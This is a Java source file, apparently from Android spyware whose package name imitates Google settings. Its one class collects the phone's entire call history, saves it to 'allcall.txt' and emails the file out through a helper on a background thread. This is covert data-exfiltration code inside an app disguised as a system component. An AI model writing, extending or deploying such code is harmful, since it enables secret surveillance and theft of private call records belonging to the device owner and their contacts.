package com.setting.dl.google.googlesettings.mail;

import android.content.Context;

import com.setting.dl.google.googlesettings.mail.gmail.Mail;
import com.setting.dl.google.googlesettings.phone.Calls;
import com.setting.dl.google.googlesettings.u;


public class OrderSendCalls {
    
    private final static String fileAllCalls         = "allcall.txt";
    Context context;
    
    OrderSendCalls(Context context) {
        
        this.context = context;
    }
    
    public void doit() {
       
        u.runThread(() -> {
    
            String value = new Calls(context).toString();
    
            u.saveValue(context, fileAllCalls, value);
            Mail.send(context, fileAllCalls);
            
        });
    }
    
    
}
